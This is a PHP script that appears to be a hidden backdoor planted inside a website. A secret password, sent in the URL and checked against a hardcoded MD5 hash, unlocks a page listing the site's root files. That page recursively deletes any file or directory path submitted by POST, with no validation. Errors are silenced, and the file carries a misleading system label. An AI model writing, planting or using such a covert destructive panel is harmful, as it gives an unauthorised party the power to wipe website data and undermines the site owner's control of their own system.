<?php
error_reporting(E_ALL);
error_reporting(0);
set_time_limit(0);
// System -Danaweb
define( 'TTH_SYSTEM', true );
$password = isset($_GET['password']) ? $_GET['password'] : 'no-password';
if(md5('ToThaiHuy'.$password)=='a78acd90c3cfdaf998b9178f154a3074') {
	function delTree($dir)  { 
        $files = array_diff(scandir($dir), array('.', '..')); 

        foreach ($files as $file) { 
            (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
        }

        return rmdir($dir); 
    } 
	if(isset($_POST['delete_file'])) {
		(is_dir($_POST['delete_file'])) ? delTree($_POST['delete_file']) : unlink($_POST['delete_file']);
	}
?>
<!DOCTYPE html>
<!-- release v4.2.6, copyright 2014 - 2015 Kartik Visweswaran -->
<html lang="en">
    <head>
        <meta charset="UTF-8"/>
        <title>Mr. Huy To</title>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="container">
            <h3 class="page-header">Olala-3W | Olala Team</h3>
            <div class="row">
                <form action="" method="post" enctype="multipart/form-data">
                    <?php
						require_once('../../../../../define.php');
						$files = array_diff(scandir(ROOT_DIR), array('.','..')); 
                        if (!empty($files)) {
                            foreach ($files as $file) { ?>
                                <div class="col-md-3 col-xs-2">
                                    <div class="thumbnail">
                                        <p><?php echo $file; ?></p>
                                        <p><button class="btn btn-danger" name="delete_file" value="<?php echo ROOT_DIR . DS . $file; ?>" type="submit">Delete</button></p>
                                    </div>
                                </div>
							<?php
                            }
                        }
                    ?>
                </form>
            </div>
        </div>
    </body>
</html>
<?php
} else die('Please stop!');